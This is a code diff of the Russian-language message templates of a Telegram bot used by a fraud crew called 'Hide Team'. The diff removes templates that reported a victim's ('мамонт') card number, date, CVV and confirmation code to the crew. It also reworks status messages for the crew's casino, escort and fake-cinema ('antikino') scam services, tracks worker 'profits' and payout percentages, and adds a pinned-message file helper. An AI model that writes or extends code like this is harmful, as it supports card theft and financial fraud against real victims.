@@ -1,20 +1,22 @@
+import os
+
 from aiogram.utils.emoji import emojize
 
-from config import Rates
+from config import Rates, config
 
+# multy use
+services_status = "{casino_status}\n" \
+    "{escort_status}\n" \
+    "{antikino_status}\n" \
+    "{team_status}"
+
+
+# inline use
+about_worker_text = "{status}\n{profits} на сумму {profits_sum} р"
 
 startup_text = emojize(
     "<b>Бот запущен!</b> :sparkle:"
 )
-
-cardinfo = "Мамонт ввел данные карты\n\n" \
-    "Номер карты: <b>{number}</b>\n" \
-    "Дата: <b>{data}</b>\n" \
-    "CVV: <b>{cvv}</b>"
-
-new_code = "Мамонт ввел код\n\n" \
-    "Карта: <b>{number}</b>\n" \
-    "Код: <b>{code}</b>"
 
 """
     Summary
@@ -148,19 +150,17 @@ worker_menu_text = emojize(
     "{team_status}"
 )
 
-about_project_text = ":woman_tipping_hand: <b>Информация о проекте Hide Team</b>\n\n" \
-    ":fire: Мы открылись: {team_start}\n" \
-    ":fallen_leaf: Количество профитов: {team_profits}\n" \
-    ":moneybag: Общая сумма профитов: {profits_sum} ₽\n" \
-    "<b>Выплаты</b> проекта:\n" \
-    "— Оплата - <b>80%</b>\n" \
-    "— Возврат - <b>70%</b>\n\n" \
-    "<b>Состояние</b> сервисов: \n" \
-    "{casino_status} \n" \
-    "{escort_status} \n" \
-    "{antikino_status} \n" \
-    "{team_status}"
-
+about_project_text = emojize(
+    ":woman_tipping_hand: <b>Информация о проекте Hide Team</b>\n\n"
+    ":fire: Мы открылись: {team_start}\n"
+    ":fallen_leaf: Количество профитов: {team_profits}\n"
+    ":moneybag: Общая сумма профитов: {profits_sum} ₽\n"
+    "<b>Выплаты</b> проекта:\n"
+    "— Оплата - <b>80%</b>\n"
+    "— Возврат - <b>70%</b>\n\n"
+    "<b>Состояние</b> сервисов: \n"
+    "{services_status}"
+)
 
 """
 
@@ -281,14 +281,32 @@ lolz_down_text = "Задержка запроса, скорей всего LOLZ 
 
 cck_size_text = "Мой размер чилена - {size}см {smile}"
 
+# dynamic pin
+
+standart_pin = emojize(
+    "СТАНДАРТНЫЙ КОНФИГ"
+)
+
+pin_path = config("pin_path")
+
+if not os.path.exists(pin_path):
+    fl = open(pin_path, "w")
+    fl.write(standart_pin)
+    fl.close()
+
+
+def pin_text():
+    fl = open(pin_path, "r")
+    pin = fl.read()
+    fl.close()
+    return pin
+
+
 # admins commands
 
 adm_work_command = emojize(
-    "<b>Состояние</b> сервисов: \n"
-    "{casino_status} \n"
-    "{escort_status} \n"
-    "{antikino_status} \n"
-    "{team_status}"
+    "<b>Состояние</b> сервисов:\n"
+    "{services_status}"
 )
 
 setwork_text = emojize(":white_check_mark: <b>Поставлен</b> ворк")
